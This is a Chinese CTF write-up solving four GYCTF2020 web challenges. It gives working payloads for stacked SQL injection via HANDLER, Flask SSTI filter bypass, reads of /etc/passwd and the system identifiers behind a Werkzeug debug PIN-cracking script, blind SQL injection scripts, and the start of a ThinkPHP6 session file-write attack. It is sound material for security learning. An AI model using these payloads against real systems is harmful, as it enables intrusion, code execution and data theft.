---
title: GYCTF2020部分WEB
date: 2020-10-11 20:30:04
---

<!-- TOC -->

- [[GYCTF2020]Blacklist](#gyctf2020blacklist)
- [[GYCTF2020]FlaskApp](#gyctf2020flaskapp)
- [[GYCTF2020]Ezsqli](#gyctf2020ezsqli)
- [[GYCTF2020]EasyThinking](#gyctf2020easythinking)

<!-- /TOC -->

<!--more-->
# [GYCTF2020]Blacklist
>堆叠注入，新的读表方法：HANDLER

页面提示`Black list is so weak for you,isn't it`，那就有waf喽，fuzz一下，输入select返回`return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`看来是过滤了这些，查了下字段，发现有两个，payload：`?inject=3' order by 2--+`，这题感觉和强网杯的随便注差不多，所以试了试堆叠注入，可以用
![databases](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.7tkwt8gksfx.png)
![tables](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.dhili382qg.png)
不过这题就不能重命名啦，需要用`HANDLER`去读，payload：`?inject=-1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#`；参考链接：https://www.cnblogs.com/20175211lyz/p/12356678.html
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.zc1dbcfcno.png)

---
# [GYCTF2020]FlaskApp
>SSTI,Flask PIN

题目已经提示很清楚了，flask，把ssti用base64加密，在丢到解密框里面试试，先来个{{7-2}}
![{{7-2}}](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.f3b8ix28a7q.png)
由于在写类的时候少写一个s，结果丢到解密框里以后失败了，爆出了部分源码
![source](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.oeibpfl8n2.png)

```python
#waf
@app.route('/decode',methods=['POST','GET'])
def decode():
    if request.values.get('text') :
        text = request.values.get("text")
        text_decode = base64.b64decode(text.encode())
        tmp = "结果 ： {0}".format(text_decode.decode())
        if waf(tmp) :
            flash("no no no !!")
            return redirect(url_for('decode'))
        res =  render_template_string(tmp)
```

在debug页面下，最右面有个shell按钮，点进去需要pin码，来看看[这个文章](https://xz.aliyun.com/t/2553)，payload：`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('想要读取的文件', 'r').read() }}{% endif %}{% endfor %}`\
先读一下源码吧，`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() }}{% endif %}{% endfor %}`
```python
from flask import Flask,render_template_string
from flask import render_template,request,flash,redirect,url_for
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired
from flask_bootstrap import Bootstrap
import base64
app = Flask(__name__)
app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y'
bootstrap = Bootstrap(app)
class NameForm(FlaskForm):
    text = StringField('BASE64加密',validators= [DataRequired()])
    submit = SubmitField('提交')
class NameForm1(FlaskForm):
    text = StringField('BASE64解密',validators= [DataRequired()])
    submit = SubmitField('提交')
def waf(str):
    black_list = ["flag","os","system","popen","import","eval","chr","request",
                  "subprocess","commands","socket","hex","base64","*","?"]
    for x in black_list :
        if x in str.lower() :
            return 1
@app.route('/hint',methods=['GET'])
def hint():
    txt = "失败乃成功之母！！"
    return render_template("hint.html",txt = txt)
@app.route('/',methods=['POST','GET'])
def encode():
    if request.values.get('text') :
        text = request.values.get("text")
        text_decode = base64.b64encode(text.encode())
        tmp = "结果  :{0}".format(str(text_decode.decode()))
        res =  render_template_string(tmp)
        flash(tmp)
        return redirect(url_for('encode'))
    else :
        text = ""
        form = NameForm(text)
        return render_template("index.html",form = form ,method = "加密" ,img = "flask.png")
@app.route('/decode',methods=['POST','GET'])
def decode():
    if request.values.get('text') :
        text = request.values.get("text")
        text_decode = base64.b64decode(text.encode())
        tmp = "结果 ： {0}".format(text_decode.decode())
        if waf(tmp) :
            flash("no no no !!")
            return redirect(url_for('decode'))
        res =  render_template_string(tmp)
        flash( res )
        return redirect(url_for('decode'))
    else :
        text = ""
        form = NameForm1(text)
        return render_template("index.html",form = form, method = "解密" , img = "flask1.png")
@app.route('/<name>',methods=['GET'])
def not_found(name):
    return render_template("404.html",name = name)
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
```
两种解法，一种直接读，一种通过PIN码实现RCE

- 直接读，[参考](https://www.cnblogs.com/h3zh1/p/12694933.html)\
虽然过滤了不少东西，但是可以用字符串拼接绕过，看看根目录下有啥

```python
{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}
#e3snJy5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXVsnX19pbXAnKydvcnRfXyddKCdvJysncycpLmxpc3RkaXIoJy8nKX19
```
![listdir](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.q046otreszm.png)
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read() }}{% endif %}{% endfor %}
#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3RoaXNfaXNfdGhlX2ZsJysnYWcudHh0JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9
```
![1flag](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.wp0ep2ibenn.png)

- PIN码实现RCE，[参考](gem-love.com/ctf/1785.html#Flaskapp)\
根据kingkk师傅说的，先找`machine-id`，payload：
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup', 'r').read() }}{% endif %}{% endfor %} 
#6f4331f28274f41c8aadc15be8828c3eb6787abad4514dd8981c7c5b94969073
```
![machine-id](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.30sa6dqznjv.png)
然后获取MAC
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address', 'r').read() }}{% endif %}{% endfor %} 
#02:42:ae:01:ac:2d
#转十进制：>>>print(0x0242ae01ac2d)
#2485410442285
```
![MAC](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.q4q9g2zv6k.png)
报错获取路径，上面已经有了：`/usr/local/lib/python3.7/site-packages/flask/app.py`\
获取用户名
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %} 
# flaskweb:x:1000:1000::/home/flaskweb:/bin/sh 
```
![username](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.jjn3z10mtx.png)
上脚本：
```python
#脚本出处：https://xz.aliyun.com/t/2553
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb',# username
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.7/site-packages/flask/app.py' 
]

private_bits = [
    '2485410442285',# address
    '6f4331f28274f41c8aadc15be8828c3eb6787abad4514dd8981c7c5b94969073'# machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```
在dubug下输入pin得到python的shell
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.3iaser10ve9.png)

---
# [GYCTF2020]Ezsqli
>无in注入，无列名注入，Mysql查询的骚姿势:`(select 'admin','admin')>(select * from users limit 1)`

>分享几个很棒的blog，[对MYSQL注入相关内容及部分Trick的归类小结](https://xz.aliyun.com/t/7169)，
[聊一聊bypass information_schema](https://www.anquanke.com/post/id/193512)，[无需“in”的SQL盲注](https://nosec.org/home/detail/3830.html)，[Y1ng](https://www.gem-love.com/ctf/1782.html)

输入框只有前两个有值，也有waf(废话)，简单fuzz一下，过滤挺多
![waf](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.edchvduxmei.png)
>id=2 --->  V&N\
id=2 || 1=1 ---> Nu1L\
id=2 || 1=5 --->  V&N\
id=2 || substr((select 1),1,1)=2 --->  V&N\
id=2 || substr((select 1),1,1)=1 ---> Nu1L

可以盲注，上脚本，information被ban了，可以使用sys.x$schema_flattened_keys
```python
import requests

url = "http://1b0e37c7-a8c6-4014-bc2e-4a582c2ec8a1.node3.buuoj.cn"
table_name = ""
i = 0

print("--------Start--------")
while True:
	i += 1
	right = 127
	left = 32

	while left < right:
		mid = (left + right) // 2
		payload = "2 || (ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),%d,1))>%d)"%(i,mid)
		data = {"id":payload}
		r = requests.post(url,data)
		#print(data)
		#print(r.text)
		if 'Nu1L' in r.text:
			left = mid + 1
		else:
			right = mid

	if chr(left) == " ":
		break
	table_name += chr(left)
	print(table_name)
```
跑出来列名为`f1ag_1s_h3r3_h7hhh,users233333333333233`，接下来就是爆数据\
上面的tick，在**无列名盲注**中提到的核心payload：`(select 'admin','admin')>(select * from users limit 1)`，原理就是通过字符比较来获取数据的，Mysql对于这种两个select的查询比较是按位来比较的，即先比较第一位，如果相等在比较第二位以此。在某一位如果前者的ASCII大，不管总长度如何，ASCII大的则大。
>alag{aaaaa}<flag{a}\
zlag{a}>flag{aaaaaaaaaa}

如此，按位比较，通过内层for循环来遍历flag，如果比较成功则结果需要是向前偏移一位的，例如`g>f`，此时正确的结果应该为`f`，即 `flag += chr(i-1)`，脚本跑的较慢，我太菜了（这题Y1ng大师傅用的hex编码比较的字符了，原理也是Mysql遇到hex会自动转成字符串），额不晓得为啥，脚本跑的flag是大写字母最后自己转小写就好了
```python
import requests

url = "http://1b0e37c7-a8c6-4014-bc2e-4a582c2ec8a1.node3.buuoj.cn"
flag = ""

print("--------Start--------")
for x in range(100):
	result = ''
	for i in range(32,128):
		result = flag + chr(i)
		payload = "2 || (select 1,'%s')>(select * from f1ag_1s_h3r3_hhhhh)"%(result)
		data = {"id":payload}
		#print(data)
		r = requests.post(url,data)
		if 'Nu1L' in r.text:
			flag += chr(i-1)
			print(flag)
			break
```

---
# [GYCTF2020]EasyThinking

登陆没sql，随便注册账号也没有给什么，扫一下发现备份文件
![www.zip](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.99kg6624k8l.png)
下载后在`README.md`文件中发现是ThinkPHP 6.0，就去seebug里搜了一下，发现有[ThinkPHP6任意文件操作漏洞分析](https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw)，或[这个复现](https://ld246.com/article/1579965339516)
![ThinkPHP6任意文件操作漏洞](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.gf4hryqp4re.png)
session可控，但是其长度必须为32位，在登陆时抓包把session改为以`.php`结尾
![session](https://raw.githubusercontent.com/yq1ng/blog/master/GYCTF2020/image.pq99jdcpj5.png)
